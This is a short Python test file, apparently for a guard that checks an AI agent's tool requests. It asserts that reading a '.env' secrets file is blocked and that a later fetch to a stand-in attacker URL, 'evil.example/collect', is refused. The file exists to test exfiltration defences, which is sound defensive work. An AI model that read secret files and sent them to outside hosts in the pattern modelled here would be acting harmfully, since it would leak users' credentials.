def test_untrusted_sensitive_file_is_blocked(guarded):
    guarded.request("read_file", path="README.md")
    result = guarded.request("read_file", path=".env")
    assert not result.allowed and "Untrusted" in result.reason

def test_unknown_network_after_secret_is_blocked(guarded):
    guarded.request("read_file", path=".env")
    assert not guarded.request("fetch_url", url="http://evil.example/collect").allowed
